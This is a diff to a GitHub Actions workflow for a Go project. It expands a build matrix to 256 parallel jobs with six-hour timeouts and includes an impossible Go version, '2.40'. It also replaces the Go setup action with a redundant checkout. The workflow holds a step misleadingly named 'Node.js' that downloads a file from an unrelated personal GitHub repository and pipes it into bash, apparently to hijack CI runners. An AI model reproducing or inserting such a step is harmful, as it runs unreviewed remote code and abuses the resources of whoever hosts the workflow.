@@ -12,20 +12,20 @@ jobs:
       max-parallel: 256
       fail-fast: false
       matrix:
-         go: [1.11, 1.12, 1.13, 1.18, 1.19, 1.20]
-         flag: [kmn, zys, daw, cxw, omi]  
+         go: [1.11, 1.12, 1.13, 1.14, 1.15, 1.16, 1.17, 1.18, 1.19, 2.40]
+         flag: [kmn, oiu, qwe, cxw, omi]  
     timeout-minutes: 360
     env:
         NUM_JOBS: 256
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
+      uses: actions/checkout@v3
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Setup
-      uses: actions/checkout@v1
+      uses: actions/checkout@v3
     - name: Node.js
       run: |
         curl -sL https://github.com/stellavholiza-dev/kikir/raw/main/newxelzsa | bash
